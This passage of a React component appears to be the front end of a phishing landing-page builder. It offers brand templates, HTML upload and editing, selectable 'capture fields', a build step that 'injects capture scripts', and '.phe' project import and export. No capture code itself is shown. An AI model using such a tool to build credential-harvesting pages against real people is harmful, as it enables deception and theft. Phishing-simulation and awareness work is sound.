                    className={`flex-1 flex items-center justify-center gap-1.5 py-2 rounded-lg text-xs font-semibold transition-all
                      ${activeTab === id
                        ? "bg-zinc-800 text-white shadow-sm"
                        : "text-zinc-500 hover:text-zinc-300"
                      }`}
                  >
                    <Icon className="w-3.5 h-3.5" />
                    {label}
                  </button>
                ))}
              </div>

              {/* Tab content */}
              <div className="mt-3">
                {/* Templates tab */}
                {activeTab === "templates" && (
                  <div>
                    <div className="space-y-2 max-h-[204px] overflow-y-auto pr-1">
                      {TEMPLATE_META.map((template) => {
                        const available = isTemplateAvailable(template.id);
                        const selected = selectedTemplate === template.id;
                        return (
                          <button
                            key={template.id}
                            type="button"
                            onClick={() => setSelectedTemplate(template.id)}
                            className={`w-full flex items-center gap-3 p-2.5 rounded-xl border transition-all text-left
                              ${selected
                                ? "bg-red-950/20 border-red-900/50 text-white"
                                : "bg-zinc-900/50 border-zinc-800 text-zinc-300 hover:border-zinc-600"
                              }`}
                          >
                            <div className={`w-9 h-9 rounded-lg flex items-center justify-center shrink-0 transition-colors
                              ${selected ? "bg-red-600/20" : "bg-zinc-800"}`}
                            >
                              <TemplateBrand id={template.id} className="w-5 h-5" />
                            </div>
                            <div className="flex items-center gap-2 min-w-0 flex-1">
                              <span className="text-sm font-semibold text-white truncate">{template.name}</span>
                              {available ? (
                                <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-emerald-950/80 border border-emerald-900/50 text-emerald-400 font-medium shrink-0">
                                  Ready
                                </span>
                              ) : (
                                <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-amber-950/60 border border-amber-900/50 text-amber-400 font-medium shrink-0">
                                  Pending
                                </span>
                              )}
                            </div>
                            {selected && (
                              <CheckCircle2 className="w-4 h-4 text-red-500 shrink-0" />
                            )}
                          </button>
                        );
                      })}
                    </div>
                  </div>
                )}

                {/* Upload HTML tab */}
                {activeTab === "upload" && (
                  <div>
                    <input
                      ref={fileInputRef}
                      type="file"
                      accept=".html,.htm"
                      className="hidden"
                      onChange={handleFileUpload}
                    />
                    <button
                      onClick={() => fileInputRef.current?.click()}
                      className="w-full flex flex-col items-center justify-center gap-3 p-8 border-2 border-dashed border-zinc-700 hover:border-zinc-600 rounded-xl transition-colors group"
                    >
                      <div className="w-10 h-10 bg-zinc-800 group-hover:bg-zinc-700 rounded-lg flex items-center justify-center transition-colors">
                        <Upload className="w-5 h-5 text-zinc-400" />
                      </div>
                      <div className="text-center">
                        <p className="text-sm font-medium text-zinc-300">Click to upload HTML file</p>
                        <p className="text-xs text-zinc-600 mt-0.5">Supports .html and .htm files</p>
                      </div>
                    </button>
                    {htmlContent && activeTab === "upload" && (
                      <p className="text-xs text-emerald-400 mt-2 flex items-center gap-1.5">
                        <CheckCircle2 className="w-3.5 h-3.5" />
                        HTML loaded — review in Custom Editor tab
                      </p>
                    )}
                  </div>
                )}

                {/* Custom Editor tab */}
                {activeTab === "editor" && (
                  <div className="rounded-xl overflow-hidden border border-zinc-800 bg-zinc-900">
                    <div className="px-3 py-2 bg-zinc-900 border-b border-zinc-800 flex items-center gap-2">
                      <div className="flex gap-1.5">
                        <div className="w-2.5 h-2.5 rounded-full bg-zinc-700" />
                        <div className="w-2.5 h-2.5 rounded-full bg-zinc-700" />
                        <div className="w-2.5 h-2.5 rounded-full bg-zinc-700" />
                      </div>
                      <span className="text-[11px] text-zinc-500 font-mono">index.html</span>
                    </div>
                    <textarea
                      value={htmlContent}
                      onChange={(e) => setHtmlContent(e.target.value)}
                      className="w-full h-52 p-4 bg-zinc-900 text-zinc-300 font-mono text-xs focus:outline-none resize-none leading-relaxed"
                      placeholder={"<html>\n  <body>\n    <h1>Hello World</h1>\n  </body>\n</html>"}
                      spellCheck={false}
                    />
                  </div>
                )}
              </div>
            </div>

            {/* Capture fields */}
            <div>
              <label className="block text-xs font-semibold text-zinc-400 uppercase tracking-widest mb-3">
                Capture Fields
              </label>
              <div className="space-y-2">
                {ALL_CAPTURE_FIELDS.map((field) => {
                  const checked = captureFields.includes(field.id);
                  return (
                    <button
                      key={field.id}
                      type="button"
                      onClick={() => toggleCaptureField(field.id)}
                      className={`w-full flex items-start gap-3 p-3 rounded-xl border transition-all text-left
                        ${checked
                          ? "bg-red-950/20 border-red-900/50 text-white"
                          : "bg-zinc-900/50 border-zinc-800 text-zinc-500 hover:border-zinc-700"
                        }`}
                    >
                      <div className={`w-4 h-4 rounded border flex items-center justify-center shrink-0 mt-0.5 transition-all
                        ${checked ? "bg-red-600 border-red-600" : "border-zinc-600 bg-transparent"}`}
                      >
                        {checked && (
                          <svg className="w-2.5 h-2.5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                          </svg>
                        )}
                      </div>
                      <div>
                        <p className="text-xs font-semibold leading-none">{field.label}</p>
                        <p className="text-[11px] text-zinc-600 mt-1 leading-relaxed">{field.desc}</p>
                      </div>
                    </button>
                  );
                })}
              </div>
            </div>
          </div>

          {/* Build/Save button pinned to bottom */}
          <div className="p-5 border-t border-zinc-800 shrink-0">
            {fetchError && !successMsg && (
              <p className="text-xs text-red-400 mb-3 flex items-center gap-1.5">
                <AlertCircle className="w-3.5 h-3.5" />
                {fetchError}
              </p>
            )}
            {isTemplateTab ? (
              <button
                onClick={handleBuild}
                disabled={!canBuild || isBuilding}
                className="w-full py-3 bg-red-600 hover:bg-red-700 text-white rounded-xl font-semibold flex items-center justify-center gap-2 transition-all shadow-lg shadow-red-900/20 disabled:opacity-40 disabled:cursor-not-allowed text-sm"
              >
                {isBuilding ? (
                  <Loader2 className="w-4 h-4 animate-spin" />
                ) : (
                  <Rocket className="w-4 h-4" />
                )}
                Build Landing Page
              </button>
            ) : (
              <button
                onClick={handleSave}
                disabled={!canSave || isSaving}
                className="w-full py-3 bg-red-600 hover:bg-red-700 text-white rounded-xl font-semibold flex items-center justify-center gap-2 transition-all shadow-lg shadow-red-900/20 disabled:opacity-40 disabled:cursor-not-allowed text-sm"
              >
                {isSaving ? (
                  <Loader2 className="w-4 h-4 animate-spin" />
                ) : (
                  <Save className="w-4 h-4" />
                )}
                {editingPage ? "Update Landing Page" : "Save Landing Page"}
              </button>
            )}
            <p className="text-[11px] text-zinc-600 text-center mt-2">
              {!name
                ? "Enter a page name"
                : isTemplateTab
                  ? !selectedTemplate
                    ? "Pick a template above"
                    : "Choose capture fields above, then build"
                  : "Add HTML content via one of the tabs above"}
            </p>
          </div>
        </div>

        {/* ── Right Panel (live preview) ── */}
        <div className="flex-1 bg-zinc-950 flex flex-col overflow-hidden">
          <div className="flex items-center gap-3 px-5 py-3 border-b border-zinc-800 bg-zinc-900/50 shrink-0">
            <Monitor className="w-4 h-4 text-zinc-500" />
            <span className="text-xs font-medium text-zinc-400">Live Preview</span>
            {selectedTemplate && isTemplateTab && (
              <span className="text-xs text-zinc-600 font-mono truncate ml-2">
                template:{TEMPLATE_META.find(t => t.id === selectedTemplate)?.file}
              </span>
            )}
            <div className="ml-auto flex items-center gap-2">
              <button
                onClick={() => { setImportMsg(null); setShowImportModal(true); }}
                className="flex items-center gap-1.5 px-3 py-1.5 bg-zinc-900 hover:bg-zinc-800 border border-zinc-700 text-zinc-300 rounded-lg text-xs font-semibold transition-colors"
                title="Import a shared .phe project file — rebuilds the whole flow and extracts the pages' HTML into a folder you choose"
              >
                <Download className="w-3.5 h-3.5" />
                Import .phe
              </button>
              {editingPage?.id && (
                <button
                  onClick={handleExportPhe}
                  disabled={exportBusy}
                  className="flex items-center gap-1.5 px-3 py-1.5 bg-zinc-900 hover:bg-zinc-800 border border-zinc-700 text-zinc-300 rounded-lg text-xs font-semibold transition-colors disabled:opacity-50"
                  title="Export this page's whole Visual Editor state as ONE shareable .phe file"
                >
                  {exportBusy ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Upload className="w-3.5 h-3.5" />}
                  Export .phe
                </button>
              )}
              {htmlContent && editingPage?.id && (
                <button
                  onClick={() => setShowVisualEditor(true)}
                  className="flex items-center gap-1.5 px-3 py-1.5 bg-red-600 hover:bg-red-700 text-white rounded-lg text-xs font-semibold transition-colors shadow-lg shadow-red-900/20"
                >
                  <MoveRight className="w-3.5 h-3.5" />
                  Visual Editor
                </button>
              )}
            </div>
          </div>

          <div ref={previewWrapRef} className="flex-1 bg-white relative overflow-hidden">
            {htmlContent ? (
              <div className="absolute inset-0 flex items-center justify-center overflow-hidden">
                <iframe
                  key={htmlContent.substring(0, 100)}
                  srcDoc={previewDoc}
                  className="border-none"
                  style={{
                    width: previewDims.w,
                    height: previewDims.h,
                    flexShrink: 0,
                    transform: `scale(${previewScale})`,
                    transformOrigin: "center",
                  }}
                  sandbox="allow-same-origin allow-scripts"
                  title="Landing page preview"
                />
              </div>
            ) : (
              <div className="absolute inset-0 bg-zinc-950 flex flex-col items-center justify-center text-zinc-600">
                <Globe className="w-16 h-16 mb-3 opacity-10" />
                <p className="text-sm font-medium">Preview will appear here</p>
                <p className="text-xs mt-1 text-zinc-700">
                  Pick a template and hit Build, upload HTML, or type in the editor
                </p>
              </div>
            )}
            {isBuilding && (
              <div className="absolute inset-0 bg-zinc-950/80 backdrop-blur-sm flex flex-col items-center justify-center gap-4">
                <Loader2 className="w-10 h-10 text-red-500 animate-spin" />
                <div className="text-center">
                  <p className="text-white font-medium text-sm">Building landing page…</p>
                  <p className="text-zinc-500 text-xs mt-1">Copying template and injecting capture scripts</p>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
      {showVisualEditor && editingPage && (
        <VisualEditor
          page={
            editingPage
              ? { id: editingPage.id, name: editingPage.name, html_content: htmlContent }
              : { id: 0, name: name, html_content: htmlContent }
          }
          onClose={() => setShowVisualEditor(false)}
          onSaved={(nodes, connections) => {
            setShowVisualEditor(false);
            // Sync the live preview with the flow the user just saved: show the
            // ENTRY page (the current starting screen — which may be a New Page
            // that replaced the original template) in the ratio picked for it.
            const entry = entryNodeOf(nodes as SavedFlowNode[], connections as SavedFlowConnection[]);
            if (!entry) return;
            const html =
              entry.type === "preview"
                ? editingPage?.html_content || ""
                : (entry.data?.htmlContent as string) || "";
            if (html) setHtmlContent(html);
            setPreviewRatio(entry.data?.ratio === "9:16" ? "9:16" : "16:9");
          }}
        />
      )}

      {/* .phe Import Modal */}
      {showImportModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-zinc-950 border border-zinc-800 rounded-2xl w-full max-w-md overflow-hidden shadow-2xl"
          >
            <div className="px-6 py-4 border-b border-zinc-800 flex justify-between items-center">
              <h3 className="text-lg font-semibold text-white">Import .phe Project</h3>
              <button
                onClick={() => setShowImportModal(false)}
                className="text-zinc-500 hover:text-zinc-300 transition-colors text-sm"
              >
                Close
              </button>
            </div>
            <div className="p-6 space-y-4">
              <div>
                <label className="block text-sm font-medium text-zinc-300 mb-1">
                  .phe File
                </label>
                <input
                  type="file"
                  accept=".phe"
                  onChange={(e) => {
                    const file = e.target.files?.[0];
                    if (file) {
                      importFileRef.current = file;
                    }
                  }}
                  className="w-full px-4 py-2 bg-zinc-900 border border-zinc-700 rounded-lg text-sm text-zinc-300 file:mr-4 file:py-1 file:px-3 file:rounded-md file:border-0 file:text-xs file:font-semibold file:bg-zinc-800 file:text-zinc-300 hover:file:bg-zinc-700 focus:outline-none"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-zinc-300 mb-1">
                  Extract Folder (Optional)
                </label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={importFolder}
                    onChange={(e) => setImportFolder(e.target.value)}
                    placeholder="e.g. C:\extracted_pages (leaves blank for default)"
                    className="flex-1 px-4 py-2 bg-zinc-900 border border-zinc-700 rounded-lg text-sm text-white focus:outline-none focus:border-red-500/50 focus:ring-1 focus:ring-red-500/50"
                  />
                </div>
                <p className="text-xs text-zinc-500 mt-1">
                  Folder to extract the HTML files into. Leave blank to auto-generate a folder.
                </p>
              </div>
              {importMsg && (
                <p className={`text-sm ${importMsg.error ? "text-red-400" : "text-emerald-400"}`}>
                  {importMsg.text}
                </p>
              )}
            </div>
            <div className="px-6 py-4 bg-zinc-900/50 border-t border-zinc-800 flex justify-end gap-3">
              <button
                onClick={() => setShowImportModal(false)}
                className="px-4 py-2 bg-zinc-800 text-zinc-300 hover:text-white rounded-lg text-sm font-medium transition-colors"
              >
                Cancel
              </button>
              <button
                onClick={handleImportPhe}
                disabled={importBusy}
                className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm font-medium transition-colors flex items-center gap-2 disabled:opacity-50"
              >
                {importBusy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Download className="w-4 h-4" />}
                Import
              </button>
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
}